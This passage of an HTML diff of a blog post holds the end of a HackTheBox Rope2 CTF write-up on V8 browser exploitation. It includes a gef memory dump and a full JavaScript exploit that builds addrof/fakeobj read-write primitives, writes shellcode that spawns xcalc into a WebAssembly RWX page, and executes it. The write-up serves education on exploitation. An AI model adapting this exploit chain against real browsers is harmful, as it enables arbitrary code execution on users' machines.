class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br></pre></td></tr></table></figure>
+<p>Let’s make a useless wasm instance and check it out in memory.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(wasm_instance)</span><br><span class="line">0x314208212475 &lt;Instance map &#x3D; 0x314208244901&gt;</span><br><span class="line">[object WebAssembly.Instance]</span><br><span class="line"></span><br><span class="line">[...snippet of vmmap output...]</span><br><span class="line">0x000034684ab28000 0x000034684ab29000 0x0000000000000000 rwx</span><br><span class="line">[...snippet of vmmap output...]</span><br><span class="line"></span><br><span class="line">gef➤  tel 0x314208212475-1 20</span><br><span class="line">0x0000314208212474│+0x0000: 0x080406e908244901</span><br><span class="line">0x000031420821247c│+0x0008: 0xe8000000080406e9</span><br><span class="line">0x0000314208212484│+0x0010: 0x0001000000007ffd</span><br><span class="line">0x000031420821248c│+0x0018: 0x0000ffff00000000</span><br><span class="line">0x0000314208212494│+0x0020: 0x0000006000000000</span><br><span class="line">0x000031420821249c│+0x0028: 0x080406e900003142 (&quot;B1&quot;?)</span><br><span class="line">0x00003142082124a4│+0x0030: 0x00005555564efd50  →  0x0000000000000000</span><br><span class="line">0x00003142082124ac│+0x0038: 0x00000000080406e9</span><br><span class="line">0x00003142082124b4│+0x0040: 0x0000000000000000</span><br><span class="line">0x00003142082124bc│+0x0048: 0x0000000000000000</span><br><span class="line">0x00003142082124c4│+0x0050: 0x0000000000000000</span><br><span class="line">0x00003142082124cc│+0x0058: 0x00005555564efe10  →  0x00007ffff7e13be0  →  0x000055555657d490  →  0x0000000000000000</span><br><span class="line">0x00003142082124d4│+0x0060: 0x0000314200000000  →  0x00007fffffffd998  →  0x0000314200000000  →  [loop detected]</span><br><span class="line">0x00003142082124dc│+0x0068: 0x000034684ab28000  →  0xcccccc000003bbe9</span><br><span class="line">0x00003142082124e4│+0x0070: 0x08088d0908088b51</span><br><span class="line">0x00003142082124ec│+0x0078: 0x0821245d08200f51</span><br><span class="line">0x00003142082124f4│+0x0080: 0x0804030d0804030d</span><br><span class="line">0x00003142082124fc│+0x0088: 0x0804030d0804030d</span><br><span class="line">0x0000314208212504│+0x0090: 0x08088cfd08088cd1</span><br><span class="line">0x000031420821250c│+0x0098: 0x0804030d08088c95 </span><br></pre></td></tr></table></figure>
+<p>The address of the <code>RWX</code> page is 0x68 bytes from the wasm instance.</p>
+<p>Now we can just copy some shellcode and run it.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> rwx_addr = ftoi(read(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]RWX PAGE: 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">	    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">	    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line">	    <span class="keyword">let</span> buf_addr = addrof(buf);</span><br><span class="line">	    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">20n</span>;</span><br><span class="line">	    write(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">		    	dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">		        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode to spawn xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]Copying Shellcode...&quot;</span>);</span><br><span class="line">copy_shellcode(rwx_addr, shellcode);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]Popping Calc...&quot;</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<img src="/2021/07/07/htb-rope2/exp.png" class="" title="exp">
+<p>Running chrome without sandbox pops xcalc.</p>
+<h3 id="full-exploit"><a href="#full-exploit" class="headerlink" title="full exploit"></a>full exploit</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// Helper functions to convert between float and integer primitives</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>); <span class="comment">// 8 byte array buffer</span></span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoi</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) = float</span></span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> BigInt(u64_buf[<span class="number">0</span>]) + (BigInt(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>); <span class="comment">// Watch for little endianness</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">itof</span>(<span class="params">val</span>) </span>&#123; <span class="comment">// typeof(val) = BigInt</span></span><br><span class="line">    u64_buf[<span class="number">0</span>] = <span class="built_in">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = <span class="built_in">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ftoh</span>(<span class="params">val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + ftoi(val).toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fl_arr = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> fl_map = fl_arr.GetLastElement();</span><br><span class="line"><span class="keyword">var</span> obj_map = itof(ftoi(fl_map)+<span class="number">0x50n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]OBJ_MAP: &quot;</span> + ftoh(obj_map));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]FLOAT MAP: &quot;</span> + ftoh(fl_map));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">in_obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">	arr.SetLastElement(obj_map);</span><br><span class="line">	arr[<span class="number">0</span>] = in_obj;</span><br><span class="line">	arr.SetLastElement(fl_map);</span><br><span class="line">	<span class="keyword">let</span> addr = arr[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">return</span> ftoi(addr) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">let</span> arr = [<span class="number">1.1</span>];</span><br><span class="line">	arr[<span class="number">0</span>] = itof(addr);</span><br><span class="line">	arr.SetLastElement(obj_map);</span><br><span class="line">	<span class="keyword">let</span> fake = arr[<span class="number">0</span>];</span><br><span class="line">	arr.SetLastElement(fl_map);</span><br><span class="line">	<span class="keyword">return</span> fake;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_arr = [fl_map, <span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">var</span> fake = fakeobj(addrof(fake_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fake_arr[<span class="number">1</span>] = itof((<span class="number">8n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">	<span class="keyword">return</span> fake[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">addr, val</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	fake_arr[<span class="number">1</span>] = itof((<span class="number">8n</span> &lt;&lt; <span class="number">32n</span>) + addr - <span class="number">8n</span>);</span><br><span class="line">	fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasm_mod = <span class="keyword">new</span> WebAssembly.Module(wasm_code);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> WebAssembly.Instance(wasm_mod);</span><br><span class="line"><span class="keyword">var</span> f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_addr = ftoi(read(addrof(wasm_instance) + <span class="number">0x68n</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]RWX PAGE: 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy_shellcode</span>(<span class="params">addr, shellcode</span>) </span>&#123;</span><br><span class="line">	    <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">	    <span class="keyword">let</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(buf);</span><br><span class="line">	    <span class="keyword">let</span> buf_addr = addrof(buf);</span><br><span class="line">	    <span class="keyword">let</span> backing_store_addr = buf_addr + <span class="number">20n</span>;</span><br><span class="line">	    write(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">		    	dataview.setUint32(<span class="number">4</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">		        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode=[<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0x782fb848</span>,<span class="number">0x636c6163</span>,<span class="number">0x48500000</span>,<span class="number">0x73752fb8</span>,<span class="number">0x69622f72</span>,<span class="number">0x8948506e</span>,<span class="number">0xc03148e7</span>,<span class="number">0x89485750</span>,<span class="number">0xd23148e6</span>,<span class="number">0x3ac0c748</span>,<span class="number">0x50000030</span>,<span class="number">0x4944b848</span>,<span class="number">0x414c5053</span>,<span class="number">0x48503d59</span>,<span class="number">0x3148e289</span>,<span class="number">0x485250c0</span>,<span class="number">0xc748e289</span>,<span class="number">0x00003bc0</span>,<span class="number">0x050f00</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]Copying Shellcode...&quot;</span>);</span><br><span class="line">copy\_shellcode(rwx\_addr, shellcode);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+]Popping Calc...&quot;</span>);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This challenge sort of demystified browser exploitation for me, and I realised that “yeah the browser is also dependent on a bunch of engines and code, and it can also have weird memory corruption bugs or logic bugs that occur in binaries”. (yes i know this is just a random ctf challenge with an unrealistic bug but…. it’s still quite cool for a beginner to browser exploitation like myself)</p>
+<p>If I have the time I’ll explore some CVEs and maybe do another writeup on it, but I probably have to mug for A Levels.</p>
+<p>Thanks for reading. Goodbye :)</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.elttam.com/blog/simple-bugs-with-complex-exploits/">https://www.elttam.com/blog/simple-bugs-with-complex-exploits/</a></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -195,111 +290,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/07/07/htb-rope2/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/06/11/hxpctf-kernelrop/" class="archive-article-date">
-  	<time datetime="2021-06-11T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-11</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/06/15/htb-breaking-grad/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HackTheBox Breaking Grad</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/06/11/hxpctf-kernelrop/">hxpctf 2020 pwn challenge</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">kernel</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/17/ctf-sg-heap-fengshui/" class="archive-article-date">
-  	<time datetime="2021-04-17T04:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/17/ctf-sg-heap-fengshui/">CTF.SG pwn challenge</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">heap</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -322,9 +412,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
